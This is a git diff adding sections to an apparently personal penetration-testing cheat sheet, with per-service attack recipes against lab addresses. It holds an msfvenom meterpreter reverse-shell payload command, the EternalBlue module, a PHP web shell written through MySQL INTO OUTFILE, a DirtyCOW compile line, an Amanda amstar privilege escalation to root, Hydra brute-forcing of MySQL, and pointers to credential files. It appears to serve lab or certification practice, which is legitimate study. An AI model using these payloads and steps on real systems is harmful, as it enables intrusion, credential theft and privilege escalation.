@@ -79,3 +79,125 @@ curl -s http://10.10.31.117:8000/kibana-log.txt | grep "root.txt"
 ````
 - Also can be used to get a shell in other situations
 - https://github.com/mpgn/CVE-2018-17246
+### Sync Breeze Enterprise
+- https://www.exploit-db.com/exploits/40456
+````
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.6.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
+````
+### Microsoft ds
+````
+exploit/windows/smb/ms17_010_eternalblue
+````
+### Android
+- 5555/tcp  open  freeciv
+- Install adb
+````
+adb connect [target ip address:port]
+````
+### Joomla versions 3.6.3
+- Able to use joomra.py in order to create an account and login 
+````
+python3 joom.py -u jack -p password -e jack@gmail.com http://10.10.10.10
+````
+- Edit the templates 
+- Add in webshell
+- Can read the config files which has the use and password, then can ssh in
+### XAMPP
+- Got in through phpmyadmin [root:no password]
+- Able to get shell through SQL database commands
+````
+SELECT "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "C:/xampp/htdocs/xampp/shell.php";
+````
+- Then browse to:
+````
+10.10.10.10/xampp/shell.php?cmd=dir
+````
+- Look for config files with passwords
+````
+C:\xampp\htdocs\admin\config.php
+````
+### Lucky GetSimple!
+````
+10.16.1.2/data/users/lucky.xml
+````
+- See the config file and passwd hash with username, crack in john 
+- PE with dirtycow [CVE-2016-5195]
+- Compile with
+````
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+````
+### Dolphin Wordpress
+- Dolphin <7.3.2 Auth bypass / RCE exploit by Ahmed Sultan
+### Codiad Impresscms
+````
+10.10.10.10/codiad/data/users.php
+````
+- Upload web shell
+- Found SSH creds
+### Backupadmin
+- Priv Esc on box with Amanda running, view by
+````
+ls -al /usr/lib/amanda
+echo '#!/bin/sh
+> /bin/sh' > priv.sh
+chmod +x priv.sh
+/usr/lib/amanada/application/amstar restore --star-path=/tmp/priv.sh
+$ whoami
+root
+````
+#### mysql Brute Force
+- mysql 3306 running on the target
+````
+hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.16.1.11
+mysql -u root 10.16.1.11 -p
+SHOW DATABASES;
+SHOW TABLES FROM helpdesk;
+USE helpdesk;
+SELECT * FROM ost_form_entry;
+````
+### IP Fire 2.15
+- Brute the admin default [admin:admin]
+- https://github.com/0xskunk/IPFire-2.15-Shellshock-Exploit/blob/master/SIPS.py
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
